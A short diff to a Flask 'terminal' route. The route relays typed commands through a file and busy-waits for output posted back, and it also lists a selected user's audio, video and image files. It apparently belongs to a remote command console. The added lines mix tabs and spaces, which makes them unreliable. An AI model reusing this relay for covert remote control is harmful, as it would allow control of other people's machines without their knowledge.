@@ -457,16 +457,18 @@ def terminal():
         return render_template("terminal.html",user=selected_user,audios=audios,videos=videos,images=images)
     elif request.method == "POST":
         cmd = request.get_json()
-        if cmd["input"]:
-            with open(os.path.join(STATIC_FOLDER,"message.txt"),"wt") as file:
-                file.write(cmd["input"])
-            while not output:
-                pass
-            shaktimaan = output
-            output = None
-            return jsonify(shaktimaan)
-        elif cmd["output"]:
-            output = cmd["output"]
+        if "input" in cmd:
+            if cmd["input"]:
+	            with open(os.path.join(STATIC_FOLDER,"message.txt"),"wt") as file:
+	                file.write(cmd["input"])
+	            while not output:
+	                pass
+	            shaktimaan = output
+	            output = None
+	            return jsonify(shaktimaan)
+        elif "output" in cmd:
+            if cmd["output"]:
+            	output = cmd["output"]
     return "done"
 
 if __name__ == "__main__":
